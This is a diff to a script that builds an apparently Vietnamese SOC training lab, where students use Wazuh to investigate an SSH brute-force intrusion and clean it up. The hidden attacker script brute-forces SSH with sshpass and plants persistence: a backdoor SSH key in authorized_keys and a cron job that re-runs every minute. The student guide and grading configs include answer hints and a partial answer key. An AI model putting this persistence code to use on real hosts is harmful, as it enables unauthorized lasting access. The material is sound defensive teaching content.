@@ -18,9 +18,12 @@ mkdir -p "$LAB/config" "$LAB/dockerfiles" "$LAB/docs" "$LAB/instr_config" \
          "$LAB/target/_bin" "$LAB/attacker/_bin" "$LAB/siem/_bin" "$LAB/defender/_bin"
 
 cat > "$LAB/config/start.config" <<'__EOF_KB1_a7f3__'
-# start.config - Lab soc-ssh-defense (Buoc 1)
-# 2 container: attacker (an, TERMINALS 0) tan cong brute-force SSH vao target.
-# Sinh vien ngoi o target: doc auth.log, chan IP ke tan cong bang iptables.
+# start.config - Bai 4: Dieu tra & Ung pho su co xam nhap SSH (Cong ty X)
+# 4 container:
+#   attacker (an, TERMINALS 0): brute-force SSH + cai cam persistence, dinh ky cai lai.
+#   target   (TERMINALS 0, GRADE): may nan nhan. Analyst KHONG co console -> phai SSH tu defender.
+#   siem     (TERMINALS 1): cai Wazuh that (indexer+server+dashboard).
+#   defender (X11, TERMINALS 1): tram analyst, Firefox xem dashboard + SSH sang target xu ly.
 
 GLOBAL_SETTINGS
 	LAB_MASTER_SEED soc-ssh-defense_student_master_seed
@@ -32,13 +35,13 @@ NETWORK  SOC_NET
 	MASK 172.20.0.0/24
 	GATEWAY 172.20.0.101
 
-# --- May nan nhan kiem tram phong thu cua sinh vien ---
+# --- May nan nhan. Analyst khong co console -> SSH tu defender sang (realistic) ---
 CONTAINER target
 	USER ubuntu
 	SOC_NET 172.20.0.10
 	ADD-HOST attacker:172.20.0.5
 	ADD-HOST siem:172.20.0.20
-	TERMINALS 1
+	TERMINALS 0
 
 # --- Ke tan cong: chay ngam, khong terminal (TERMINALS 0 = "hidden") ---
 CONTAINER attacker
@@ -67,49 +70,118 @@ CONTAINER defender
 __EOF_KB1_a7f3__
 
 cat > "$LAB/config/about.txt" <<'__EOF_KB1_a7f3__'
-SOC Lab 1 - Phong thu SSH brute-force.
-Mot may tan cong (an) lien tuc do mat khau SSH vao may cua ban.
-Nhiem vu: phat hien qua log va chan IP ke tan cong bang iptables.
+Bai 4 (Chang 1) - Dieu tra & Ung pho su co xam nhap SSH.
+Mot ke tan cong (an) brute-force SSH, chiem mot tai khoan nhan vien va cai cam
+persistence (SSH key backdoor + cron), dinh ky cai lai. Nhiem vu: dieu tra tren
+Wazuh (IOC, phan biet tai khoan bi do vs bi chiem, tim persistence) roi ung pho
+(chan IP, go sach, khoa tai khoan). Duong ong Wazuh THAT (agent -> manager -> dashboard).
 __EOF_KB1_a7f3__
 
 cat > "$LAB/config/parameter.config" <<'__EOF_KB1_a7f3__'
 # parameter.config - ca nhan hoa (chong chep bai)
-# Moi sinh vien co so <EMPID> khac nhau -> tai khoan bi chiem la emp<EMPID> khac nhau.
-# Token EMPID duoc thay bang so ngau nhien trong ca 2 file: target fixlocal + attacker attack.sh
+# EMPID: moi SV mot tai khoan bi chiem emp<EMPID> khac nhau (target fixlocal + attacker attack.sh).
+# BKDR : so hieu implant, nhung vao comment SSH-key backdoor va ten script cron tren attacker.
+#        -> cau hoi dieu tra C5 (so implant) cung khac nhau tung SV. Cham bang parameter.BKDR.
 EMPID : RAND_REPLACE : target:.local/bin/fixlocal.sh;attacker:attack.sh : EMPID : 1000 : 9999
+BKDR : RAND_REPLACE : attacker:attack.sh : BKDR : 100 : 999
 __EOF_KB1_a7f3__
 
 cat > "$LAB/docs/read_first.txt" <<'__EOF_KB1_a7f3__'
-=== SOC Lab: Ung pho su co xam nhap SSH (Wazuh SIEM) ===
+========================================================================
+  BAI 4 - DIEU TRA & UNG PHO SU CO XAM NHAP SSH (Cong ty X)
+========================================================================
 
-Mot ke tan cong da brute-force SSH vao "target" va CHIEM DUOC mot tai khoan nhan vien,
-roi CAI CAM de quay lai (SSH key backdoor + cronjob doc). No con dinh ky cai lai,
-nen ban phai CHAN duoc no thi don dep moi triet de.
+Chang 0 ban tap DOC va SO SANH log. Hom nay la ca truc that: SIEM bao dong mot
+chuoi dang nhap SSH THAT BAI don dap vao mot server cua Cong ty X - dau hieu
+BRUTE-FORCE. Nhiem vu cua ban (SOC analyst): DIEU TRA xem chuyen gi da xay ra,
+ke tan cong CHIEM duoc gi, cai cam gi - roi UNG PHO cho triet de.
 
-Nhiem vu: DIEU TRA va UNG PHO tu tram DEFENDER (khong lam truc tiep tren target).
+Day la lan dau ban lam viec voi DUONG ONG THAT: tan cong that -> agent Wazuh
+that tren may nan nhan -> canh bao that tren dashboard (khong phai log nap san).
 
-*** Lan dau: cho siem cai Wazuh xong (~8-10'):  tail -f /var/log/wazuh-install.log ***
+!!! LAN DAU: siem can ~8-10' de cai xong Wazuh. Neu dashboard chua vao duoc,
+    doi them vai phut (tren siem co the xem:  tail -f /var/log/wazuh-install.log).
 
---- 1) Dashboard (tren defender, Firefox tu mo) ---
-  https://172.20.0.20   (Advanced -> Add Exception)
-  admin / (tren siem chay: sudo cat /root/wazuh-admin-credentials.txt)
-  -> Threat Hunting: tim IP tan cong, va TAI KHOAN NAO bi chiem
-     (tai khoan co su kien dang nhap THANH CONG, khac voi chi bi thu that bai).
+------------------------------------------------------------------------
+0) HAI TRAM LAM VIEC
+------------------------------------------------------------------------
+  - defender: Firefox tu mo dashboard  https://172.20.0.20
+      (neu bao canh bao chung chi -> Advanced -> Accept the Risk / Add Exception)
+      Dang nhap:  admin / (lay mat khau: tren siem chay  sudo cat /root/wazuh-admin-credentials.txt)
+      (mat khau admin DOI moi lan build lai siem -> cu cat file tren de lay ban moi nhat)
+  - target (may nan nhan): KHONG co man hinh rieng. Analyst phai SSH tu defender:
+      ssh analyst@target            (mat khau: analyst)
+      (go "yes" neu hoi host key. Tu day ban vua GHI PHIEU vua UNG PHO.)
 
---- 2) Dieu tra & ung pho (SSH tu defender sang target) ---
-  ssh analyst@target            (mat khau: analyst)
-  a. Xac dinh tai khoan bi chiem:  sudo cat /var/log/auth.log | grep "Accepted password"
-                                   (dang: "Accepted password for emp#### from 172.20.0.5")
-  b. Chan ke tan cong:             sudo iptables -A INPUT -s <IP> -j DROP
-  c. Go SSH key backdoor:          soat /home/<user>/.ssh/authorized_keys,
-                                   xoa dong co 'backdoor@attacker'
-  d. Xoa cronjob doc:              sudo crontab -u <user> -l
-                                   sudo crontab -u <user> -r   (hoac xoa dong .beacon)
-  e. Khoa tai khoan bi chiem:      sudo passwd -l <user>
-  f. Kiem chung: khong con backdoor/cron; SSH hop le van hoat dong.
+------------------------------------------------------------------------
+1) DIEU TRA - GHI PHIEU (tren target)
+------------------------------------------------------------------------
+File khung ~/dieu-tra.txt DA CO SAN tren target (5 dong C1=..C5= de trong).
+SSH sang va MO RA DIEN SO:  ssh analyst@target  ->  nano ~/dieu-tra.txt
+Tra loi 6 cau, GHI SO sau moi dau '=', moi cau 1 dong dang  Cx=<so>  :
 
-Xong: checkwork (tu kiem tra) hoac stoplab (nop bai).
-Muc tieu: incident_resolved = Y  (da chan + khoa + go sach backdoor & cron).
+  C1. Octet cuoi IP ke tan cong? (dang 172.20.0.X -> ghi so X)
+  C2. id tai khoan bi CHIEM? (tai khoan co su kien dang nhap THANH CONG tu ke
+      tan cong, dang emp#### -> chi ghi phan SO, vi du emp4521 -> 4521)
+  C3. Tai khoan bi DO brute-force (RAT NHIEU lan that bai) la ai? (ghi SO lua chon)
+        1 = emp<id>    2 = alice    3 = analyst    4 = root
+  C4. So hieu IMPLANT: comment cua SSH-key la co dang 'backdoor-<SO>@attacker',
+      va ten script cron doc la '/tmp/.beacon<SO>.sh'. Hai cho dung CUNG mot <SO>
+      (bang chung cung mot ke). Ghi <SO> do.
+  C5. Tong cong ke tan cong cai may LOP duy tri (persistence)? (tim du, dung sot)
+
+  Vi du noi dung ~/dieu-tra.txt :
+      C1=5
+      C2=4521
+      C3=2
+      C4=742
+      C5=2
+
+------------------------------------------------------------------------
+2) TIM O DAU (3 cap goi y)
+------------------------------------------------------------------------
+ Cap 1: Tren dashboard (Threat Hunting / Discover, index wazuh-alerts-*) hay
+        phan biet 2 loai su kien: dang nhap THAT BAI (bi do) vs THANH CONG (bi chiem).
+ Cap 2:
+   C1/C2: Loc su kien dang nhap. "Accepted password ... from 172.20.0.5" -> lay IP (C1)
+          va ten tai khoan bi chiem (C2). Luu y: tai khoan bi DO nhieu (that bai)
+          KHAC tai khoan bi CHIEM (thanh cong) - do la bay cua C3.
+   C4/C5: Soi dau vet cai cam TREN tai khoan bi chiem (sau khi ssh sang target):
+            Lop 1 - SSH key la:  cat /home/emp<id>/.ssh/authorized_keys   (dong 'backdoor-<SO>@attacker')
+            Lop 2 - cron doc:    sudo crontab -u emp<id> -l               (dong /tmp/.beacon<SO>.sh)
+          Hai noi cung mot <SO> -> C4. Dem du 2 lop -> C5=2.
+ Cap 3 (dap an huong dan):
+   C1=5 (attacker 172.20.0.5). C3=2 (alice bi do, emp<id> moi bi chiem).
+   C5=2. C2 va C4 KHAC NHAU tung nguoi -> phai tu tim.
+
+------------------------------------------------------------------------
+3) UNG PHO - THU TU QUAN TRONG !
+------------------------------------------------------------------------
+  Ke tan cong CAI LAI persistence moi ~20 giay. Vi vay:
+  => CHAN ke tan cong TRUOC, DON DEP SAU. Neu don truoc khi chan, backdoor moc lai.
+
+  (tren target, qua ssh analyst@target)
+  a. CHAN IP:          sudo iptables -A INPUT -s 172.20.0.5 -j DROP
+  b. Go SSH key la:    soat /home/emp<id>/.ssh/authorized_keys, xoa dong 'backdoor-...@attacker'
+  c. Xoa cron doc:     sudo crontab -u emp<id> -r      (hoac xoa dong .beacon)
+  d. Khoa tai khoan:   sudo passwd -l emp<id>
+  e. Kiem chung:       khong con backdoor/cron; SSH hop le van dung.
+
+------------------------------------------------------------------------
+4) DOC THEM (kham pha - KHONG cham diem) -> ban dap cho Chang 2
+------------------------------------------------------------------------
+  Tren dashboard, tim canh bao co mo ta dang "Multiple authentication failures"
+  hoac "brute force". Do la mot RULE TUONG QUAN: no gom NHIEU su kien that bai
+  le te thanh MOT canh bao muc cao hon. Ghi lai rule.id cua no.
+  -> Sang Chang 2 (Detection Engineering) ban se TU VIET loai rule tuong quan nay.
+
+------------------------------------------------------------------------
+5) NOP BAI
+------------------------------------------------------------------------
+  checkwork  -> can dat:
+     * bai4_dieutra   (dieu tra dung >= 4/5 cau)
+     * incident_resolved = Y  (da CHAN + KHOA + go sach backdoor & cron)
+  Xong: stoplab
 __EOF_KB1_a7f3__
 
 cat > "$LAB/dockerfiles/Dockerfile.soc-ssh-defense.target.student" <<'__EOF_KB1_a7f3__'
@@ -332,26 +404,28 @@ __EOF_KB1_a7f3__
 cat > "$LAB/instr_config/results.config" <<'__EOF_KB1_a7f3__'
 # results.config - trich du lieu cham diem (doc tu prestop.stdout)
 
+# --- PHAN A: dieu tra (SV ghi ~/dieu-tra.txt tren target, dang C1=..C5=) ---
+_c1 = target:prestop.stdout : GROUP : 1 : REGEX : C1\s*=\s*([0-9]+)
+_c2 = target:prestop.stdout : GROUP : 1 : REGEX : C2\s*=\s*([0-9]+)
+_c3 = target:prestop.stdout : GROUP : 1 : REGEX : C3\s*=\s*([0-9]+)
+_c4 = target:prestop.stdout : GROUP : 1 : REGEX : C4\s*=\s*([0-9]+)
+_c5 = target:prestop.stdout : GROUP : 1 : REGEX : C5\s*=\s*([0-9]+)
+
+# --- PHAN B: ung pho (chi cai SV thao tac) ---
 _marker      = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
 # Da chan IP ke tan cong?
 _blocked     = target:prestop.stdout : FILE_REGEX : 172\.20\.0\.5(/32)? -j (DROP|REJECT)
-# Co dau vet brute-force (Failed) va chiem tai khoan (Accepted) tu attacker?
-_bruteforce  = target:prestop.stdout : FILE_REGEX : Failed password.*172\.20\.0\.5
-_compromised = target:prestop.stdout : FILE_REGEX : Accepted password.*172\.20\.0\.5
 # Persistence con sot? (backdoor SSH key / cronjob doc)
-_backdoor    = target:prestop.stdout : FILE_REGEX : backdoor@attacker
+_backdoor    = target:prestop.stdout : FILE_REGEX : backdoor-[0-9]+@attacker
 _cron        = target:prestop.stdout : FILE_REGEX : \.beacon
 # Tai khoan bi chiem da bi khoa? (shadow: emp<so>:! hoac *)
 _locked      = target:prestop.stdout : FILE_REGEX : emp[0-9]+:[!*]
-# SIEM (siem) co ghi nhan tan cong? Agent ket noi?
-_siem_detected   = siem:prestop.stdout : FILE_REGEX : Failed password.*172\.20\.0\.5
-_agent_connected = siem:prestop.stdout : FILE_REGEX : target.*Active
 
 # --- Goi y checkwork ---
 #CHECK_TRUE: Chua chan IP ke tan cong. VD: sudo iptables -A INPUT -s 172.20.0.5 -j DROP
 cw_blocked = target:prestop.stdout : FILE_REGEX : 172\.20\.0\.5(/32)? -j (DROP|REJECT)
-#CHECK_FALSE: Van con SSH key backdoor (backdoor@attacker) - hay xoa khoi authorized_keys cua tai khoan bi chiem.
-cw_backdoor = target:prestop.stdout : FILE_REGEX : backdoor@attacker
+#CHECK_FALSE: Van con SSH key backdoor (backdoor-<so>@attacker) - hay xoa khoi authorized_keys cua tai khoan bi chiem.
+cw_backdoor = target:prestop.stdout : FILE_REGEX : backdoor-[0-9]+@attacker
 #CHECK_FALSE: Van con cronjob doc (.beacon) - hay xoa crontab cua tai khoan bi chiem.
 cw_cron = target:prestop.stdout : FILE_REGEX : \.beacon
 #CHECK_TRUE: Chua khoa tai khoan bi chiem. VD: sudo passwd -l emp<so>
@@ -361,13 +435,21 @@ __EOF_KB1_a7f3__
 cat > "$LAB/instr_config/goals.config" <<'__EOF_KB1_a7f3__'
 # goals.config - tieu chi dat/khong dat (nhieu buoc)
 
-# Phat hien: co brute-force va co tai khoan bi chiem
-detected_attack    = boolean : _bruteforce
-account_compromised = boolean : _compromised
-# SIEM hoat dong
-siem_detected      = boolean : _siem_detected
-agent_connected    = boolean : _agent_connected
-# Xu ly su co (nhieu buoc)
+# ===== PHAN A: DIEU TRA (phieu ~/dieu-tra.txt) =====
+# C1=octet IP ke tan cong(5) ; C2=id tai khoan bi CHIEM(parameter.EMPID) ;
+# C3=tai khoan bi DO la ai (trac nghiem, alice=2) ;
+# C4=so hieu implant trong comment key va ten cron (parameter.BKDR) ; C5=so lop duy tri(2).
+q1 = matchany : integer_equal : _c1 : answer=5
+q2 = matchany : integer_equal : _c2 : parameter.EMPID
+q3 = matchany : integer_equal : _c3 : answer=2
+q4 = matchany : integer_equal : _c4 : parameter.BKDR
+q5 = matchany : integer_equal : _c5 : answer=2
+# Dat Phan A khi dung >= 4/5
+bai4_dieutra = count_greater : 3 : (q1, q2, q3, q4, q5)
+
+# ===== PHAN B: UNG PHO (chi cham viec SV THUC SU lam) =====
+# (Da bo detected_attack/account_compromised/siem_detected/agent_connected:
+#  nhung cai do tu dung du SV khong lam gi -> khong do duoc nang luc.)
 blocked_attacker   = boolean : _blocked
 backdoor_key_removed  = boolean : ( _marker and_not _backdoor )
 malicious_cron_removed = boolean : ( _marker and_not _cron )
@@ -394,6 +476,10 @@ echo "$PW" | sudo -S bash -c 'echo "empEMPID:Password123" | chpasswd'
 echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
 echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
 echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null
+
+# Tao san KHUNG phieu dieu tra cho analyst (SV chi dien SO sau moi dau '=').
+# Chi tao neu chua co -> khong de len dap an SV neu fixlocal chay lai.
+echo "$PW" | sudo -S bash -c '[ -f /home/analyst/dieu-tra.txt ] || { printf "# Phieu dieu tra - dien SO sau moi dau \"=\" (xem goi y trong read_first)\nC1=\nC2=\nC3=\nC4=\nC5=\n" > /home/analyst/dieu-tra.txt; chown analyst:analyst /home/analyst/dieu-tra.txt; chmod 644 /home/analyst/dieu-tra.txt; }'
 
 # Bat password authentication cho sshd (de ghi Failed/Accepted vao auth.log)
 echo "$PW" | sudo -S sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
@@ -433,6 +519,10 @@ echo "=== emp shadow lock ==="
 for u in $(ls /home 2>/dev/null | grep '^emp'); do
   sudo -n grep "^$u:" /etc/shadow 2>/dev/null
 done
+
+echo "=== dieu-tra (phieu dieu tra cua analyst) ==="
+sudo -n cat /home/analyst/dieu-tra.txt 2>/dev/null
+cat /home/analyst/dieu-tra.txt 2>/dev/null
 __EOF_KB1_a7f3__
 
 cat > "$LAB/target/_bin/treataslocal" <<'__EOF_KB1_a7f3__'
@@ -456,7 +546,8 @@ TARGET=target
 VICTIM=empEMPID
 GOODPW=Password123
 FAILPW_LIST="123456 admin root toor qwerty letmein 111111 abc123 iloveyou monkey dragon"
-BK="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNRXGMHgh57sbtVbThblDy9ISjZ0dXlDeu+hIq4jyKlUMbuO/pf+dRNe0t+y5UDO9CrhPtzvVbKHyvWiIlLqSPgYv4MHU/B7J1n0ML5wo4xwd1Ei8EkNNqGhE/Lc9paN/r3NX9EBkr82Cl5r9zG2pdfokFiRZflToW4lvdckIzOA64p9N1yLfcawfxKb10Zo+WCDo3yB5GBIznKBEN+5flJpmDXtdcf8Iheq1wdGZKmcp1ECXZNbRw+LbKoiho/XfyDNePAiEGGGdo7XisXfEhvP3TCGPZOJpS8Y6shsQdPLKDmQsmF46rw0PLe+yRevrU9zd0Det4AsewngiUyVyl backdoor@attacker"
+# Implant ca nhan hoa: comment khoa chua so hieu BKDR (khac nhau tung SV).
+BK="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNRXGMHgh57sbtVbThblDy9ISjZ0dXlDeu+hIq4jyKlUMbuO/pf+dRNe0t+y5UDO9CrhPtzvVbKHyvWiIlLqSPgYv4MHU/B7J1n0ML5wo4xwd1Ei8EkNNqGhE/Lc9paN/r3NX9EBkr82Cl5r9zG2pdfokFiRZflToW4lvdckIzOA64p9N1yLfcawfxKb10Zo+WCDo3yB5GBIznKBEN+5flJpmDXtdcf8Iheq1wdGZKmcp1ECXZNbRw+LbKoiho/XfyDNePAiEGGGdo7XisXfEhvP3TCGPZOJpS8Y6shsQdPLKDmQsmF46rw0PLe+yRevrU9zd0Det4AsewngiUyVyl backdoor-BKDR@attacker"
 
 SSH_OPTS="-o PreferredAuthentications=password -o PubkeyAuthentication=no \
 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4"
@@ -464,9 +555,9 @@ SSH_OPTS="-o PreferredAuthentications=password -o PubkeyAuthentication=no \
 install_persistence() {
   sshpass -p "$GOODPW" ssh $SSH_OPTS ${VICTIM}@${TARGET} \
     "mkdir -p ~/.ssh && chmod 700 ~/.ssh; \
-     grep -q 'backdoor@attacker' ~/.ssh/authorized_keys 2>/dev/null || echo '$BK' >> ~/.ssh/authorized_keys; \
-     printf '#!/bin/bash\n# beacon\n:\n' > /tmp/.beacon.sh && chmod +x /tmp/.beacon.sh; \
-     ( crontab -l 2>/dev/null | grep -v '.beacon'; echo '* * * * * /bin/bash /tmp/.beacon.sh' ) | crontab -" \
+     grep -q 'backdoor-BKDR@attacker' ~/.ssh/authorized_keys 2>/dev/null || echo '$BK' >> ~/.ssh/authorized_keys; \
+     printf '#!/bin/bash\n# beacon\n:\n' > /tmp/.beaconBKDR.sh && chmod +x /tmp/.beaconBKDR.sh; \
+     ( crontab -l 2>/dev/null | grep -v '.beaconBKDR.sh'; echo '* * * * * /bin/bash /tmp/.beaconBKDR.sh' ) | crontab -" \
     2>/dev/null
 }
 
@@ -522,17 +613,39 @@ cd /root/wz 2>/dev/null || cd /root
 echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
 bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
 echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
-# Trich mat khau admin ra file de tien tra cuu
+# Trich mat khau admin ra file de tien tra cuu (login dashboard: admin + mat khau nay)
+# -> dong bo voi cac lab cai-that khac (privesc/sqli-waf/threathunt/webshell/patch-pwn).
 tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
   | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
 __EOF_KB1_a7f3__
 
 cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_KB1_a7f3__'
 #!/bin/bash
-# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
-# Chi chay duoi quyen user thuong (khong phai root).
+# Mo Wazuh dashboard trong Firefox tren tram defender.
+# LUU Y: file nay duoc SOURCE vao shell dang nhap -> TUYET DOI khong goi 'exit' (tat terminal)
+# va khong chay vong lap/sleep o foreground (treo terminal). Toan bo bon vao MOT SUBSHELL NEN ( ) &.
+#
+# CHONG LOI "firefox khong len / cannot open display": tu tao MOT FILE symlink
+# /tmp/.X11-unix/X<n> -> /var/tmp/.X11-unix/X<n> (TUYET DOI khong bien ca thu muc /tmp/.X11-unix
+# thanh symlink -> tranh loi doX11Link "same file").
 if ! id | grep -q 'uid=0'; then
-  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
+  (
+    export DISPLAY="${DISPLAY:-:0}"
+    dn="${DISPLAY#:}"; dn="${dn%%.*}"
+    ensure_x11() {
+      [ -d /tmp/.X11-unix ] || mkdir -p /tmp/.X11-unix 2>/dev/null
+      if [ ! -S "/tmp/.X11-unix/X$dn" ] && [ -S "/var/tmp/.X11-unix/X$dn" ]; then
+        ln -sf "/var/tmp/.X11-unix/X$dn" "/tmp/.X11-unix/X$dn" 2>/dev/null
+      fi
+    }
+    for _ in $(seq 1 20); do
+      ensure_x11
+      [ -S "/tmp/.X11-unix/X$dn" ] && break
+      sleep 2
+    done
+    ensure_x11
+    ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
+  ) >/dev/null 2>&1 &
 fi
 __EOF_KB1_a7f3__
 
